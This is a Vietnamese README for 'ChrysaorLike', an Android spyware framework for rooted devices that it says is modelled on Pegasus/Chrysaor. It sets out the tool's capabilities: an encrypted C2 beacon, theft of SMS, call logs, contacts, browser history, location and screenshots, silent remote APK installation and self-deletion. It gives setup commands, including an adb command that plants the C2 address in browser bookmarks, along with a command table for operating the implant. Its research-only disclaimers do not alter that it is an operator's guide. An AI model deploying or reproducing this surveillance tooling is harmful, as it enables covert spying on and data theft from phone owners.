\# ChrysaorLike



\*\*Hệ thống giám sát và điều khiển từ xa trên Android đã root\*\*



ChrysaorLike là một framework Android nhẹ, có kiến trúc mô-đun, được xây dựng dựa trên ý tưởng từ phần mềm gián điệp Pegasus/Chrysaor của NSO Group. Dự án được phát triển nhằm phục vụ \*\*mục đích nghiên cứu, học tập và phòng thủ an ninh\*\* trên các thiết bị Android đã root (API 23 trở lên).



> \*\*Lưu ý:\*\* Dự án chỉ dành cho mục đích nghiên cứu và giáo dục. Chỉ sử dụng trên các thiết bị thuộc quyền sở hữu của bạn. Mọi hành vi sử dụng trái phép đều có thể vi phạm pháp luật.



\---



\## Tính năng



| Tính năng                         | Mô tả                                                                                 |

| --------------------------------- | ------------------------------------------------------------------------------------- |

| \*\*Kênh C2 được mã hóa\*\*           | Beacon HTTP được mã hóa bằng AES-256 với khóa riêng cho từng phiên kết nối.           |

| \*\*Thu thập thông tin thiết bị\*\*   | Thu thập IMEI, kiểu máy, phiên bản Android, trạng thái pin và thông tin mạng di động. |

| \*\*Truy xuất SMS/MMS\*\*             | Đọc tin nhắn thông qua ContentProvider hoặc SQLite khi cần.                           |

| \*\*Truy xuất nhật ký cuộc gọi\*\*    | Đọc lịch sử cuộc gọi qua ContentProvider hoặc SQLite.                                 |

| \*\*Truy xuất danh bạ\*\*             | Đọc dữ liệu danh bạ qua ContentProvider hoặc SQLite.                                  |

| \*\*Truy xuất lịch sử trình duyệt\*\* | Đọc lịch sử duyệt web qua ContentProvider hoặc SQLite.                                |

| \*\*Truy xuất lịch\*\*                | Đọc các sự kiện trong lịch qua ContentProvider hoặc SQLite.                           |

| \*\*Chụp màn hình\*\*                 | Chụp ảnh màn hình bằng `screencap` và chuyển đổi sang PNG hoặc JPEG.                  |

| \*\*Thu thập vị trí\*\*               | Lấy vị trí GPS thông qua `dumpsys` hoặc `LocationManager`.                            |

| \*\*Cấu hình từ xa\*\*                | Cập nhật địa chỉ máy chủ và các tham số cấu hình từ xa.                               |

| \*\*Tải và cài đặt ứng dụng\*\*       | Tự động tải và cài đặt APK từ máy chủ thông qua WAP Push hoặc cơ chế nạp dịch vụ.     |

| \*\*Tự hủy\*\*                        | Gỡ cài đặt ứng dụng từ xa bằng lệnh `pm uninstall`.                                   |

| \*\*Bảng điều khiển Web\*\*           | Giao diện Web theo dõi dữ liệu theo thời gian thực và gửi lệnh điều khiển từ xa.      |



\---



\---



\## Quick start



\### Yêu cầu



\* \*\*Thiết bị Android:\*\* Đã root (Magisk/SuperSU), API 23 trở lên.

\* \*\*Máy chủ:\*\* Python 3.8 trở lên, `pip`, `flask`, `pycryptodome`.

\* \*\*ADB:\*\* Đã cài đặt Android Debug Bridge trên máy tính.



\---



\### 1. Thiết lập máy chủ



```bash

\# Sao chép hoặc tải mã nguồn dự án

cd /path/to/ChrysaorLike



\# Cài đặt các thư viện phụ thuộc

pip install flask pycryptodome



\# Tạo thư mục lưu các tệp APK mẫu

mkdir -p samples



\# Sao chép APK thử nghiệm (ví dụ: demo.apk) vào thư mục samples/

cp /path/to/demo.apk samples/



\# Khởi động máy chủ C2

python C2Chrysaor.py

```



\### 2. Thiết lập ứng dụng client side (APK)



\#### Biên dịch APK



```bash

\# Android Studio

Build → Generate Signed APK



```



\#### Cài đặt và khởi tạo cấu hình



```bash

\# Cài đặt APK

adb install app-release.apk



\# Khởi tạo cấu hình thông qua Browser Provider (thực hiện một lần)

adb shell "content insert --uri content://browser/bookmarks \\

&#x20; --bind url:s:'http://example.com/?t=myToken123\&c=base64Cmd\&d=310\&b=1\&h=10.0.2.2\&p=8080#rU8IPXbn' \\

&#x20; --bind title:s:'seed'"



\# Khởi chạy ứng dụng

adb shell am start -n com.android.chrysaoralike/.MainActivity



\# Theo dõi nhật ký

adb logcat -s BrowserHistoryExtractor ConfigExtractorService HttpCommandService

```



> \*\*Lưu ý:\*\* Khi triển khai trên thiết bị thật, thay `10.0.2.2` bằng địa chỉ IP của máy chủ.



\---



\### 3. Bảng điều khiển Web



Truy cập:



```

http://127.0.0.1:8080/

```



Bảng điều khiển cung cấp các chức năng:



\* Hiển thị danh sách thiết bị đang kết nối.

\* Gửi lệnh điều khiển đến thiết bị.

\* Theo dõi dữ liệu thu thập theo thời gian thực.

\* Hiển thị ảnh chụp màn hình và các dữ liệu được gửi về.



\---



\## Danh sách lệnh hỗ trợ



| ID | Lệnh         | Chức năng                                                             |

| -- | ------------ | --------------------------------------------------------------------- |

| 0  | \*\*KILL\*\*     | Tự gỡ cài đặt ứng dụng.                                               |

| 1  | \*\*LOCATE\*\*   | Thu thập vị trí GPS.                                                  |

| 3  | \*\*SET\*\*      | Cập nhật cấu hình máy chủ và tham số hoạt động.                       |

| 4  | \*\*CAMERA\*\*   | Chụp ảnh màn hình thiết bị.                                           |

| 5  | \*\*EXECUTE\*\*  | Thu thập SMS, nhật ký cuộc gọi, danh bạ, lịch sử trình duyệt và lịch. |

| 10 | \*\*WAP PUSH\*\* | Tải xuống và cài đặt APK từ máy chủ.                                  |



\---



\## Ví dụ sử dụng



\### 1. Thu thập thông tin thiết bị



Khởi động máy chủ:



```bash

python C2Chrysaor.py

```



Sau khi thiết bị gửi beacon, bảng điều khiển sẽ hiển thị các thông tin như:



\* Thời gian

\* IMEI

\* Thông tin mạng di động



\---



\### 2. Chụp ảnh màn hình



Gửi lệnh \*\*CAMERA (ID = 4)\*\* từ bảng điều khiển.



Nếu cần kích hoạt beacon ngay lập tức:



```bash

adb shell am broadcast -a com.android.chrysaoralike.FORCE\_BEACON

```



Ảnh chụp sẽ được hiển thị trực tiếp trên bảng điều khiển.



\---



\### 3. Thu thập dữ liệu



Gửi lệnh \*\*EXECUTE (ID = 5)\*\*.



Dữ liệu thu thập bao gồm:



\* SMS

\* Nhật ký cuộc gọi

\* Danh bạ

\* Lịch sử trình duyệt

\* Sự kiện trong lịch



\---



\### 4. Cài đặt APK từ xa



Điều kiện:



\* APK đã được ký.

\* Tệp APK được đặt trong thư mục `samples/`.



Gửi lệnh \*\*WAP PUSH (ID = 10)\*\*.



Ứng dụng sẽ tải APK từ máy chủ, cài đặt và xóa tệp cài đặt sau khi hoàn tất.



\---



\### 5. Cập nhật địa chỉ máy chủ



Gửi lệnh \*\*SET (ID = 3)\*\*.



Ví dụ:



```

http\_host=192.168.1.200\&http\_port=9090

```



Các lần beacon tiếp theo sẽ sử dụng địa chỉ máy chủ mới.



\---



\### 6. Tự hủy



Gửi lệnh \*\*KILL (ID = 0)\*\*.



Ứng dụng sẽ tự gỡ cài đặt bằng lệnh `pm uninstall`.





\## Tuyên bố pháp lý và đạo đức



Dự án chỉ phục vụ mục đích học tập, nghiên cứu và hỗ trợ công tác phòng thủ an ninh mạng.



\* Chỉ sử dụng trên các thiết bị thuộc quyền sở hữu hoặc được phép kiểm thử.

\* Không sử dụng để giám sát, thu thập dữ liệu hoặc thực hiện các hành vi xâm nhập khi chưa có sự cho phép rõ ràng của chủ sở hữu.

\* Việc sử dụng trái phép có thể vi phạm quy định pháp luật hiện hành.

\* Tác giả không chịu trách nhiệm đối với bất kỳ hành vi lạm dụng hoặc sử dụng sai mục đích nào của dự án.



